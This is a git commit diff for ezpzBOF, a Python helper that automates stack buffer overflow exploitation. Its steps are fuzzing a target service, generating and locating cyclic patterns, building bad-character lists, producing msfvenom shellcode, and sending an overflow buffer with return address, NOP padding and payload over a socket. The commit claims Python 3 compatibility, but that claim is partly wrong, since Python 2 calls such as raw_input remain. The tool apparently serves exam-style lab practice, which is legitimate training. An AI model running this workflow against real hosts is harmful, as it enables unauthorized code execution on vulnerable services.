0ffa66a7f845259f83673f43f50ecb8c60fed56a
Kim Schulz <kim@schulz.dk>
2021-03-03 04:40:46 -0500

    Update ezpzBOF-v2.0.py
    fixed indentation errors and made it python3 compatible

--- My Tools/Ezpz BOF/ezpzBOF-v2.0.py
+++ My Tools/Ezpz BOF/ezpzBOF-v2.0.py
@@ -21,10 +21,10 @@ def header():
 |   __|___ ___ ___| __  |     |   __|   _ _|_  | |   |
 |   __|- _| . |- _| __ -|  |  |   __|  | | |  _|_| | |
 |_____|___|  _|___|_____|_____|__|      \_/|___|_|___|
-          |_|                                         
-            			  [Customize By H0j3n]
-''')
-    	return banner
+		  |_|                                         
+						  [Customize By H0j3n]
+						  ''')
+	return banner
 
 # ----Variable (Manually @ Auto) -> Depends on your needed----
 # IP	 => The Target IP
@@ -67,14 +67,14 @@ PAYLOAD = ""
 
 # Color Function
 def yellow(STRING):
-    return Style.BRIGHT+Fore.YELLOW+STRING+Fore.RESET
+	return Style.BRIGHT+Fore.YELLOW+STRING+Fore.RESET
 
 def red(STRING):
-    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET
+	return Style.BRIGHT+Fore.RED+STRING+Fore.RESET
 
 def cyan(STRING):
-    return Style.BRIGHT+Fore.CYAN+STRING+Fore.RESET
-    
+	return Style.BRIGHT+Fore.CYAN+STRING+Fore.RESET
+
 # Copy2Cliboard Function
 def copy2clip(txt):
 	cmd='echo -n '+txt.strip()+'| xclip -sel clip'
@@ -83,16 +83,16 @@ def copy2clip(txt):
 # Fuzzer Function
 def fuzzer_option(IP,PORT,PREFIX,ENTERS,POSTFIX):
 	print(cyan("\t-----------------------"))
-        print(cyan("\t|       FUZZER        |"))
+	print(cyan("\t|       FUZZER        |"))
 	print(cyan("\t-----------------------"))
 	if IP == "" or PORT == 0:
 		red("\n[-] Please Check Your IP and PORT again!")
 		sys.exit(-1)
-	print cyan("\n[+] IP : "+ IP)
-	print cyan("[+] PORT : "+ str(PORT))
-	print cyan("[+] PREFIX : \'"+ str(PREFIX) + "\'")
-	print cyan("[+] PREFIX : \'"+ str(POSTFIX) + "\'")
-	print cyan("[+] ENTERS : \'"+ str(ENTERS) + "\'\n")
+	print(cyan("\n[+] IP : "+ IP))
+	print(cyan("[+] PORT : "+ str(PORT)))
+	print(cyan("[+] PREFIX : \'"+ str(PREFIX) + "\'"))
+	print(cyan("[+] PREFIX : \'"+ str(POSTFIX) + "\'"))
+	print(cyan("[+] ENTERS : \'"+ str(ENTERS) + "\'\n"))
 	TIMEOUT = 5
 	BUFFER = []
 
@@ -138,12 +138,12 @@ def fuzzer_option(IP,PORT,PREFIX,ENTERS,POSTFIX):
 # Create Pattern
 def pcreate():
 	print(cyan("\t-----------------------"))
-        print(cyan("\t|   CREATE PATTERN    |"))
+	print(cyan("\t|   CREATE PATTERN    |"))
 	print(cyan("\t-----------------------"))
 	print(cyan("\n[+] Example => Enter Length of Pattern : 1500\n"))
 	PATTERN = raw_input("Enter Length of Pattern : ")
 	if PATTERN == "":
-		print red("\n[-] You did not put any length!")
+		print(red("\n[-] You did not put any length!"))
 		sys.exit(-1)
 	CMD = "msf-pattern_create -l " + PATTERN
 	PS = subprocess.Popen(CMD,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
@@ -152,9 +152,9 @@ def pcreate():
 	print(yellow("!mona findmsp -distance " + str(PATTERN)))
 	print(cyan("\n[+] Commands Use in this step:"))
 	print(yellow(CMD))
-	print yellow("\n" + RESULT)
+	print(yellow("\n" + RESULT))
 	OPTIONS = raw_input(cyan("Do you want to copy to clipboard (y,n)?"))
-	
+
 	if OPTIONS == 'y':
 		copy2clip(RESULT)
 	return [None,[PATTERN,RESULT.strip()]]
@@ -162,22 +162,22 @@ def pcreate():
 # Check Pattern Offset
 def poffset():
 	print(cyan("\t-----------------------------"))
-        print(cyan("\t|    CHECK PATTERN OFFSET   |"))
+	print(cyan("\t|    CHECK PATTERN OFFSET   |"))
 	print(cyan("\t-----------------------------"))
-	print cyan("\n[+] Example => Enter Pattern : Ad2A")
+	print(cyan("\n[+] Example => Enter Pattern : Ad2A"))
 	PATTERN = raw_input("\nEnter Pattern : ")
 	CMD = "msf-pattern_offset -q " + PATTERN
 	PS = subprocess.Popen(CMD,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
 	print(cyan("\n[+] Commands Use in this step:"))
 	print(yellow(CMD))
 	RESULT = PS.communicate()[0]
-	print yellow("\n" + RESULT.strip())
+	print(yellow("\n" + RESULT.strip()))
 	return [None,[RESULT.strip()]]
-	
+
 # Exploit Function
 def exploit_option(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET):
 	print(cyan("\t----------------"))
-        print(cyan("\t|    EXPLOIT   |"))
+	print(cyan("\t|    EXPLOIT   |"))
 	print(cyan("\t----------------"))
 	print(cyan("\n[+] Please use the mona commands below that relate to this step!"))
 	print(yellow("!mona findmsp -distance " + str(len(PAYLOAD))))
@@ -186,28 +186,28 @@ def exploit_option(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,O
 	INPUTS = raw_input("\nConfirm To Exploit? (y,n) : ")
 	if INPUTS == 'y':
 		BUFFER = PREFIX + OVERFLOW + RETN + PADDING + PAYLOAD + POSTFIX
-		
+
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		try :
-			    s.connect((IP, PORT))
-			    print("\nSending evil buffer...")
-			    s.send(BUFFER + ENTERS.decode('string-escape'))
-			    print("Trying to exploit....")
+			s.connect((IP, PORT))
+			print("\nSending evil buffer...")
+			s.send(BUFFER + ENTERS.decode('string-escape'))
+			print("Trying to exploit....")
 
 		except:
-			    print(red("[-] Could not connect to " + IP + ":" + str(PORT)))
+			print(red("[-] Could not connect to " + IP + ":" + str(PORT)))
 	else:
-		print cyan("Thank you for using ezpzBOF!")
-        return [None,[]]
-		
+		print(cyan("Thank you for using ezpzBOF!"))
+		return [None,[]]
+
 # Bad Character Option
 def badchar_option():
 	print(cyan("\t----------------------"))
-        print(cyan("\t|    BAD CHARACTER   |"))
+	print(cyan("\t|    BAD CHARACTER   |"))
 	print(cyan("\t----------------------"))
-	print cyan("\n[+] Example No Badchar (Please include \\x00) => Enter Bad Characters: \\x00")
-	print cyan("[+] Example Got Badchar => Enter Bad Characters: \\x02\\x03\\x04")
-	
+	print(cyan("\n[+] Example No Badchar (Please include \\x00) => Enter Bad Characters: \\x00"))
+	print(cyan("[+] Example Got Badchar => Enter Bad Characters: \\x02\\x03\\x04"))
+
 	INPUTS = raw_input("\n[+] Enter Bad Characters: ")
 	OUTPUT_INPUTS = r"{0}".format(INPUTS)
 	LISTREM = INPUTS.split("\\x")
@@ -217,17 +217,17 @@ def badchar_option():
 		if "{:02x}".format(x) not in LISTREM:
 			LISTBADCHAR += r"\x" + "{:02x}".format(x)
 			OUTPUT += r"\\x" + "{:02x}".format(x)
-	print cyan("\n[+] Bad Character => " + OUTPUT_INPUTS)
-	print cyan("[+] Original Bad Character Length => 1020")
-	print cyan("[+] Current Bad Character Length => " + str(len(LISTBADCHAR)) + "\n")
+	print(cyan("\n[+] Bad Character => " + OUTPUT_INPUTS))
+	print(cyan("[+] Original Bad Character Length => 1020"))
+	print(cyan("[+] Current Bad Character Length => " + str(len(LISTBADCHAR)) + "\n"))
 	print(cyan("[+] Please use the mona commands below that relate to this step!"))
 	print(yellow("!mona bytearray -b " + r"{0}".format(OUTPUT_INPUTS)))
 	print(yellow("!mona jmp -r esp -cpb " + r"{0}".format(OUTPUT_INPUTS)))
 	print(yellow("!mona compare -f C:\mona\oscp\\bytearray.bin -a <ESP>"))
 	#print(yellow("!mona bytearray -b \'\\x" + "00\'"))
 	#print(yellow("!mona jmp -r esp -cpb \'\\x" + "00\'"))
-	print cyan("\nBad Character To Copy:\n")
-	print yellow(r"{0}".format(LISTBADCHAR))
+	print(cyan("\nBad Character To Copy:\n"))
+	print(yellow(r"{0}".format(LISTBADCHAR)))
 	OPTIONS = raw_input(cyan("\nDo you want to copy to clipboard (y,n)?"))
 
 	if OPTIONS == 'y':
@@ -237,9 +237,9 @@ def badchar_option():
 # Msvenom Payload
 def payload(LHOST,LPORT,BADCHAR):
 	print(cyan("\t----------------------"))
-        print(cyan("\t|   Create Payload   |"))
+	print(cyan("\t|   Create Payload   |"))
 	print(cyan("\t----------------------"))
-	print cyan("\n[+] Options (Target Machine) \n\t0 - Linux\n\t1 - Windows\n")
+	print(cyan("\n[+] Options (Target Machine) \n\t0 - Linux\n\t1 - Windows\n"))
 	OPTIONS = ""
 	while (OPTIONS != "0") and (OPTIONS != '1'):
 		OPTIONS = str(raw_input("Enter Options: "))
@@ -254,10 +254,10 @@ def payload(LHOST,LPORT,BADCHAR):
 		print(yellow(CMD))
 		PS = subprocess.Popen(CMD,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
 		RESULT = str(PS.communicate()[0]).strip()
-		print "\n"
+		print("\n")
 		for line in RESULT.split("\n"):
 			if VARIABLE in line:
-				print yellow(line.strip())
+				print(yellow(line.strip()))
 				OUTPUT_PRINT += line
 				OUTPUT_PRINT += r"\n"
 	else:
@@ -270,10 +270,10 @@ def payload(LHOST,LPORT,BADCHAR):
 		print(yellow(CMD))
 		PS = subprocess.Popen(CMD,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
 		RESULT = str(PS.communicate()[0]).strip()
-		print "\n"
+		print("\n")
 		for line in RESULT.split("\n"):
 			if VARIABLE in line:
-				print yellow(line.strip())
+				print(yellow(line.strip()))
 				OUTPUT_PRINT += line
 				OUTPUT_PRINT += r"\n"
 	OPTIONS = raw_input(cyan("\nDo you want to copy to clipboard (y,n)?"))
@@ -325,13 +325,13 @@ def check(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET):
 		PRINT_CHECK += red("\n[-] PAYLOAD is not Update Yet")
 	else:
 		PRINT_CHECK += cyan("\n[+] PAYLOAD Updated with Length => " + str(len(PAYLOAD)))
-		
-	print PRINT_CHECK
+
+	print(PRINT_CHECK)
 
 # Auto Function
 def auto():
 	print(cyan("\t----------------------"))
-        print(cyan("\t|     AUTOMATION     |"))
+	print(cyan("\t|     AUTOMATION     |"))
 	print(cyan("\t----------------------"))
 	IP = raw_input(cyan("\n[+] Enter Target IP: "))
 	PORT = int(raw_input(cyan("\n[+] Enter Target PORT: ")))
@@ -344,28 +344,28 @@ def auto():
 	RETN = ""
 	PADDING = "\x90" * 0
 	PAYLOAD = "" 
-	print "\n"
+	print("\n")
 	# FUZZER STEP
 	if OPTIONS == 'y':
 		RESULT = fuzzer_option(IP,PORT,PREFIX,ENTERS,POSTFIX)
 		if len(RESULT[1]) == 100:
-			print red("\n[-] Something went wrong please check your IP or PORT!")
+			print(red("\n[-] Something went wrong please check your IP or PORT!"))
 			sys.exit(-1)
-			
+
 	# CREATE PATTERN STEP
 	RESULT = pcreate()
-	
+
 	# EXPLOIT 1
 	PAYLOAD = RESULT[1][1]
-	print PAYLOAD
+	print(PAYLOAD)
 	RESULT = exploit_option(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET)
-	print RESULT
-	
+	print(RESULT)
+
 	# CHECK OFFSET PATTERN
 	OPTIONS = raw_input(cyan("\n[+] Do you want to check offset manually (y/n)?"))
 	if OPTIONS == 'y':
 		RESULT = poffset()
-		print RESULT
+		print(RESULT)
 	else:
 		OFFSET = int(raw_input(cyan("\n[+] What is the Offset you found?")))
 		OVERFLOW = "A" * OFFSET
@@ -387,12 +387,12 @@ def auto():
 	else:
 		INPUTS = raw_input(cyan("\n[+] Please Enter your Badchar : "))
 		BADCHAR = r"{0}".format(INPUTS)
-		
+
 	# PADDING	
-	print cyan("\n[+] Example of Padding => \\x90 * 16 @ \\x90 * 32")
+	print(cyan("\n[+] Example of Padding => \\x90 * 16 @ \\x90 * 32"))
 	VALUE = int(raw_input(cyan("\n[+] What is the value of Padding (in number)?")))
 	PADDING = "\x90" * VALUE
-			
+
 	# MAKE PAYLOAD & EXPLOIT3
 	COND = True
 	while (COND):
@@ -424,28 +424,28 @@ def auto():
 			PAYLOAD = PAYLOAD2.decode('string-escape')
 			RESULT = exploit_option(IP,PORT,PREFIX,POSTFIX,ENTERS,OVERFLOW,RETN,PADDING,PAYLOAD,OFFSET)
 		else:
-			print header()
+			print(header())
 			sys.exit(-1)
 	return None
-		
-	
-	
+
+
+
 
 # Main    	
 if __name__ == "__main__":
-	print header()
+	print(header())
 	if len(sys.argv) != 2:
-		print red("[+] Usage Auto (Still in BETA):  python %s auto" % sys.argv[0])		
-		print red("[+] Usage Fuzzer:\t\t python %s fuzzer" % sys.argv[0])
-		print red("[+] Usage Pattern Create:\t python %s pcreate" % sys.argv[0])
-		print red("[+] Usage Pattern Offset:\t python %s poffset" % sys.argv[0])
-		print red("[+] Usage Bad Characeter:\t python %s badchar" % sys.argv[0])
-		print red("[+] Usage Exploit:\t\t python %s exploit" % sys.argv[0])
-		print red("[+] Usage Checker:\t\t python %s checker" % sys.argv[0])
-		print red("[+] Usage Msfvenom Payload:\t python %s payload" % sys.argv[0])
+		print(red("[+] Usage Auto (Still in BETA):  python %s auto" % sys.argv[0])		)
+		print(red("[+] Usage Fuzzer:\t\t python %s fuzzer" % sys.argv[0]))
+		print(red("[+] Usage Pattern Create:\t python %s pcreate" % sys.argv[0]))
+		print(red("[+] Usage Pattern Offset:\t python %s poffset" % sys.argv[0]))
+		print(red("[+] Usage Bad Characeter:\t python %s badchar" % sys.argv[0]))
+		print(red("[+] Usage Exploit:\t\t python %s exploit" % sys.argv[0]))
+		print(red("[+] Usage Checker:\t\t python %s checker" % sys.argv[0]))
+		print(red("[+] Usage Msfvenom Payload:\t python %s payload" % sys.argv[0]))
 		sys.exit(-1)
 	OPTIONS = sys.argv[1]
-	
+
 	if OPTIONS == "fuzzer":
 		RESULT = fuzzer_option(IP,PORT,PREFIX,ENTERS,POSTFIX)
 	elif OPTIONS == "pcreate":
@@ -463,8 +463,8 @@ if __name__ == "__main__":
 	elif OPTIONS == "auto":
 		RESULT = auto()
 	else:
-		print "Please Put Correct Usage !"
+		print("Please Put Correct Usage !")
 		sys.exit(-1)
-	
 
-	print cyan("\n[COMPLETED]")
+
+	print(cyan("\n[COMPLETED]"))
